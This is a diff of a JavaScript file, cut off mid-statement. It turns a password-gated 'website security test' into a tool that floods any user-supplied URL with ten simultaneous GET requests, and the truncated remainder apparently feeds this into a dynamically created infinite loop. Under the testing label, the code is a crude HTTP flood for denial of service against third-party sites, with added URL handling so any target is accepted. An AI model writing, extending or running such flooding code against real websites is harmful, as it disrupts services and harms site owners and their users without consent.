@@ -16,21 +16,37 @@ let iteration = 0;
 function mango() {
     password = document.getElementById('password').value;
     if (password === "javascript") {
-        const websiteUrl = prompt("Enter the website URL (without 'https://www.'):");
+        const websiteUrl = prompt("Enter the website URL:");
         if (websiteUrl) {
-            targetUrl = 'https://www.' + websiteUrl;
+            targetUrl = normalizeUrl(websiteUrl);
             testWebsiteSecurity();
         }
     } else {
         alert("Incorrect password");
-        window.location.href = "https://www.example.com";
     }
 }
 
+function normalizeUrl(url) {
+    // Remove 'https://' or 'http://' if present
+    url = url.replace(/^https?:\/\//, '');
+
+    // Remove 'www.' if present
+    url = url.replace(/^www\./, '');
+
+    // Add 'https://www.' if not already present
+    if (!url.startsWith('https://') && !url.startsWith('http://')) {
+        url = 'https://www.' + url;
+    }
+
+    return url;
+}
+
 function testWebsiteSecurity() {
-    const xhr = new XMLHttpRequest();
-    xhr.open('GET', targetUrl, true);
-    xhr.send();
+    for (let i = 0; i < 10; i++) { // Send 10 requests simultaneously
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', targetUrl, true);
+        xhr.send();
+    }
 
     // Dynamically create and execute a new infinite loop
     const newLoop = new Function('iteration', `
